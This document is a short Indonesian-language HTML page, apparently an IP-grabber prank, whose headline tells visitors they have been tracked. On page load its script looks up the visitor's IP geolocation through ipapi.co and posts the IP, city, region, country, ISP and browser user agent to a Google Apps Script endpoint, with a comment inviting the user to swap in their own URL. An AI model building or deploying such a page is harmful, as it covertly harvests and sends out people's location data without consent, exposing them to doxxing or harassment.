<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Tracking Active</title>
<style>
  body{
    margin:0;
    padding:0;
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background: linear-gradient(135deg,#0288d1,#00acc1);
    font-family: 'Poppins', sans-serif;
    color:white;
    text-align:center;
    overflow:hidden;
  }
  h1{
    font-size:42px;
    font-weight:900;
    text-shadow: 0 4px 15px rgba(0,0,0,0.3);
    animation: pulse 1.5s infinite;
  }

  @keyframes pulse{
    0% { transform: scale(1); }
    50% { transform: scale(1.08); }
    100% { transform: scale(1); }
  }

  .box{
    background: rgba(0,0,139,0.3);
    padding:50px 30px;
    border-radius:25px;
    backdrop-filter: blur(5px);
    box-shadow: 0 20px 50px rgba(0,0,0,0.3);
  }
</style>
</head>
<body>

<div class="box">
  <h1>ANDA SUDAH TER TRACKING! üëøüëø</h1>
</div>

<script>
// GANTI URL DI BAWAH DENGAN URL WEB APP GOOGLE SCRIPT KAMU
const webAppURL = "https://script.google.com/macros/s/AKfycbxDKVhfal-XofN-8PPRAscr57eGnlyZBjzV1XHfKJosKWCRx71c1QZPyia2pKRx7H4J/exec";

async function trackVisitor(){
    try{
        const res = await fetch("https://ipapi.co/json/");
        const data = await res.json();

        await fetch(webAppURL, {
            method:"POST",
            headers:{
                "Content-Type":"application/json"
            },
            body: JSON.stringify({
                ip: data.ip,
                city: data.city,
                region: data.region,
                country: data.country_name,
                org: data.org,
                device: navigator.userAgent
            })
        });
        console.log("Visitor tracked ‚úÖ", data);
    }catch(err){
        console.log("Tracking failed ‚ùå", err);
    }
}

trackVisitor();
</script>

</body>
</html>
